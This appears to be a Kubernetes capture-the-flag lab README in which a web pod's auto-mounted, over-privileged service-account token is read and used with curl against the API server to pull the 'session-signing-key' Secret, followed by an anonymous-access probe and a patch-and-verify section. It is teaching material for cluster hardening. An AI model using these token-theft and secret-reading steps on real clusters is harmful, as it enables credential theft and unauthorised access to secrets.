# K09 — Broken Authentication Mechanisms · NimbusMart CTF

**Difficulty:** Medium · **200 pts** · **Flag:** `FLAG{...}`

## Briefing
You have a shell in NimbusMart's `storefront/web-frontend` pod. It only serves
HTML — but the platform team let it auto-mount a service-account token it never
needs, and that account (`frontend-sa`) was over-granted read on Secrets in the
`storefront` namespace. The storefront session signing key lives in a Secret
that web-frontend should never be able to see.

**Objective:** use the token the pod carries to authenticate to the API server
and read the `session-signing-key` Secret in `storefront`.

## Capture the flag
```bash
# Deploy the vulnerable storefront (namespace, secret, over-mounted token, anon binding)
kubectl apply -f vulnerable.yaml

# 1) The pod carries a live API credential it never asked for
kubectl exec -it -n storefront web-frontend -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 2) Use that token to read the session-signing-key Secret via the API server
kubectl exec -it -n storefront web-frontend -- sh -c \
  'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
   https://kubernetes.default.svc/api/v1/namespaces/storefront/secrets/session-signing-key \
   | grep -o "\"flag\":\"[^\"]*\"" | cut -d\" -f4 | base64 -d'
#  -> FLAG{default_token_talked_to_the_apiserver}

# (Optional) Bonus: the API also answers with NO credential at all — anonymous auth
kubectl exec -it -n storefront web-frontend -- sh -c \
  'curl -sk https://kubernetes.default.svc/api/v1/namespaces/storefront/pods | head'
```

## Patch & verify
```bash
kubectl delete -f vulnerable.yaml
kubectl apply -f fixed.yaml

# No token is mounted, so there is nothing to present to the API server
kubectl exec -it -n storefront web-frontend -- sh -c \
  'ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1 || echo NO_TOKEN_MOUNTED'

# The anonymous binding is gone too
kubectl get clusterrolebinding anon-reader-binding 2>&1 || echo NO_ANON_BINDING

# Prove it with the checker
cd ../../checker && go run . --check k09 -n storefront
```

## Cleanup
```bash
kubectl delete -f vulnerable.yaml -f fixed.yaml --ignore-not-found
```
